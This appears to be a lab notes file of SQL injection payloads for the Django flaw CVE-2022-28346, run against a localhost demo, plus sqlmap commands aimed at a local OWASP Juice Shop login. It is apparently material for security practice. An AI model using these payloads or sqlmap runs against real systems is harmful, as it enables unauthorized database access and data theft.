# python-web-security

```
# cve 2022 28346
http://localhost:8000
http://localhost:8000/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --

http://localhost:8000/demo?field=demo.name" FROM "demo_user" --
http://localhost:8000/demo?field=demo.name" FROM "demo_user"; --

# Postgresql
http://localhost:8000/demo?field=demo.name" FROM "demo_user" GROUP BY "demo_user"."id","demo_user"."name" union select 1, 'hacked', 3 --
http://localhost:8000/demo?field=demo.name" FROM "demo_user" GROUP BY "demo_user"."id","demo_user"."name" union select 1, version(), 3 --
```

# SQLMAP

```bash
$ python sqlmap.py -u "http://localhost:3000/rest/user/login" --data="email=user@example.com&password=test" --ignore-code=401

$  python sqlmap.py -u "http://localhost:3000/rest/user/login" --data="email=user@example.com&password=test" --ignore-code=401 --level=5 --risk=3 --dbms=sqlite
```

# juice-shop

`http://localhost:3000`
